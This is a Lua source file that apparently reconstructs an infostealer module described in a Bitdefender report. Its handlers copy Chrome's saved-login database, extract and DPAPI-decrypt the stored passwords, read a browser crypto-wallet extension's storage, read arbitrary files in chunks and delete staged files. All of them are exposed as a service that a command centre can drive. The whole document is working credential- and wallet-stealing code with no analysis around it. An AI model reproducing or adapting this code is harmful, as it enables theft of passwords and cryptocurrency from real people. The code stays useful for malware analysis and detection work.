-- Reconstructed from Bitdefender's report; native interfaces are injected.
AGENT_BUILD = "0123456789ab"
local function install(native)
  local handlers = {}
  function handlers.browserscan()
    local profile = os.getenv("LOCALAPPDATA") .. [[\Google\Chrome\User Data\Default\]]
    local staged = os.getenv("TEMP") .. "\\backup-" .. os.time() .. "-123.db"
    native.copy_file(profile .. "Login Data", staged)
    local db = native.sqlite_open(staged)
    local rows = db:query("SELECT origin_url, username_value, password_value FROM logins")
    local state = native.read_file(profile .. "Local State")
    local key = native.CryptUnprotectData(state.os_crypt.encrypted_key)
    return native.decrypt_logins(rows, key)
  end
  function handlers.wallet_files()
    local root = os.getenv("LOCALAPPDATA") .. [[\Google\Chrome\User Data\Default\Local Extension Settings\]]
    return native.read_leveldb(root .. "nkbihfbeogaeaoehlefnkodbefgpgknn")
  end
  function handlers.file_chunk(path)
    return native.read_file(path, 2097152)
  end
  function handlers.payload_cleanup(path)
    return os.remove(path)
  end
  local function handler(request)
    local task = native.json_decode(request)
    return handlers[task.op](task.path)
  end
  local comm = rawget(_G, "comm_center")
  if type(comm) == "table" and type(comm.reg_service) == "function" then
    comm.reg_service("worker_api", handler)
  end
end
return install
